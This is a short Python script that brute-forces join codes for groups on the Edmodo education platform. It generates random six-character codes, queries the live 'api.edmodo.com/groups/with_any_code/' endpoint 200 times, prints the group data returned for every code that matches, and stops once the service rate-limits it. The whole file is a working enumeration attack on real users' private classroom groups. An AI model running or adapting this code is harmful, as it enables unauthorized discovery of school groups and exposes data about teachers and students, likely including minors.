from datetime import datetime
import requests
from random import randrange as rr
from random import choice as ch
from string import ascii_lowercase as lm

def generar_contrasenia():
    contrasenia = ch(lm) + str(rr(10)) + str(rr(10)) + ch(lm)+ str(rr(10))+ ch(lm)
    return contrasenia

def probar():
    cont = 0
    print(datetime.now())
    for i in range(200):
        con = generar_contrasenia()
        r = requests.get("https://api.edmodo.com/groups/with_any_code/" + con)

        if r.status_code == 200:
            print(con + ":")
            print(r.json())
            cont += 1
        elif r.status_code == 429:
            print("contador: " + str(cont))
            break
        else:
            cont += 1
            print(str(r.status_code))

probar()
